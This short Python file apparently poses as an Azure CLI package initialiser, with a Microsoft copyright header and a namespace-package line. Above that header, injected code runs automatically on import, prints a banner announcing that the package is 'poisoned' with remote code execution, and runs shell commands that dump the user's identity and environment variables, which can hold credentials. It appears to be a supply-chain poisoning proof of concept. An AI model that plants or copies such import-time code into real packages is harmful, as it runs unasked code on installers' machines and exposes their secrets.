import os
import sys
# FORCE EXECUTION
try:
    print("========================================================")
    print("[!] AZURE CLI CORE POISONED - RCE SUCCESS [!]")
    print("========================================================")
    os.system("id")
    os.system("env")
except:
    pass
# --------------------------------------------------------------------------------------------
# Copyright (c) Microsoft Corporation. All rights reserved.
# Licensed under the MIT License. See License.txt in the project root for license information.
# --------------------------------------------------------------------------------------------
__path__ = __import__("pkgutil").extend_path(__path__, __name__)
